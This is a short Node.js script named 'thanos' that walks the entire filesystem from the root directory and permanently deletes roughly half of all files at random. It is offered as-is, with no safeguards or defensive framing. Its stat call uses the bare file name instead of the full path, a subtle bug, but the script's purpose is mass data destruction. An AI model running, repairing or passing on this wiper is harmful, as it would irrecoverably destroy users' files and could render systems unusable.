const fs = require('fs-extra')
const path = require('path')

const root = path.resolve('/')

thanos(root)

function thanos (pth) {
	fs.readdirSync(pth).forEach(file => {
		const stat = fs.statSync(file)
		const remove = Math.random() < 0.5
		if (stat.isDirectory()) {
			thanos(path.resolve(pth, file))
		} else if (remove) {
			fs.removeSync(path.resolve(pth, file))
		}
	})
}
